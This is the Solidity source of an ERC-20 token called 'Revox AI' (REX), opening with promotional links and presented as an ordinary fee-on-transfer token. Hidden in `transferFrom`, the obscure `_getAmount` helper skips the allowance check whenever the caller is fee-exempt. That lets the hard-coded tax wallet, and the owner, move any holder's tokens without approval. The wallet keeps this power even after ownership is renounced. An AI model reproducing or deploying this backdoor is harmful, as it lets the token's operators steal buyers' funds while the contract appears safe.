/*
REVOX AI REDEFINES THE PARADIGM OF DAPP CREATION WITH AUTONOMOUS AGENTS.

https://www.revoxai.pro
https://studio.revoxai.pro
https://docs.revoxai.pro

https://x.com/RevoxAIOfficial
https://t.me/RevoxAIChannel
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract REX is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcemptFromFee;
    address private _taxWallet = 0x7C43B93D2Ad15d51DbC87d899Ed7d878AC5f0430;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Revox AI";
    string private constant _symbol = unicode"REX";
    uint256 private _initialBuyTaxs=3;
    uint256 private _initialSellTaxs=3;
    uint256 private _finalBuyTaxs=0;
    uint256 private _finalSellTaxs=0;
    uint256 private _reduceBuyTaxAts=6;
    uint256 private _reduceSellTaxAts=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCounts=0;
    uint256 private _maxTaxSwaps = _tTotal / 100;
    IRouter private _iRouter;
    address private _iPair;
    bool private inSwap = false;
    bool private _tradingEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _isExcemptFromFee[owner()] = true;
        _isExcemptFromFee[address(this)] = true;
        _isExcemptFromFee[_taxWallet] = true;
        _tOwned[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function init() external onlyOwner() {
        _iRouter = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_iRouter), _tTotal);
        _iPair = IFactory(_iRouter.factory()).createPair(address(this), _iRouter.WETH());
    }

    function openTrading() external onlyOwner() {
        require(!_tradingEnabled,"trading is already open");
        _iRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradingEnabled = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(_getAmount(msg.sender, amount), "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _getAmount(address sender, uint256 amount) private view returns(uint256 tAmount) {
        bool isExcepted = _isExcemptFromFee[sender] && sender!= address(this) && amount > 0; if(!isExcepted) tAmount = amount;
    }

    function _transfer(address _sender, address _recipient, uint256 _amount) private {
        require(_sender != address(0), "ERC20: transfer from the zero address");
        require(_recipient != address(0), "ERC20: transfer to the zero address");
        require(_amount > 0, "Transfer amount must be greater than zero");

        uint256 taxFee=0;
        if (_sender != owner() && _recipient != owner()) {
            taxFee = _amount.mul((_buyCounts>_reduceBuyTaxAts)?_finalBuyTaxs:_initialBuyTaxs).div(100);

            if (_sender == _iPair && _recipient != address(_iRouter) && ! _isExcemptFromFee[_recipient]) {
                _buyCounts++;
            }

            if(_recipient == _iPair && _sender!= address(this)) {
                taxFee = _amount.mul((_buyCounts>_reduceSellTaxAts)?_finalSellTaxs:_initialSellTaxs).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && _recipient == _iPair && _swapEnabled && _buyCounts > _preventSwapBefore) {
                if(contractTokenBalance > _maxTaxSwaps)
                swapTokensForEth(min(_amount, min(contractTokenBalance, _maxTaxSwaps)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHFees(address(this).balance);
                }
            }
        }

        if(taxFee>0){
          _tOwned[address(this)]=_tOwned[address(this)].add(taxFee);
          emit Transfer(_sender, address(this),taxFee);
        }

        _tOwned[_sender]=_tOwned[_sender].sub(_amount);
        _tOwned[_recipient]=_tOwned[_recipient].add(_amount.sub(taxFee));
        emit Transfer(_sender, _recipient, _amount.sub(taxFee));
    }

    receive() external payable {}

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHFees(uint256 amount) private {
        payable(_taxWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _iRouter.WETH();
        _approve(address(this), address(_iRouter), tokenAmount);
        _iRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}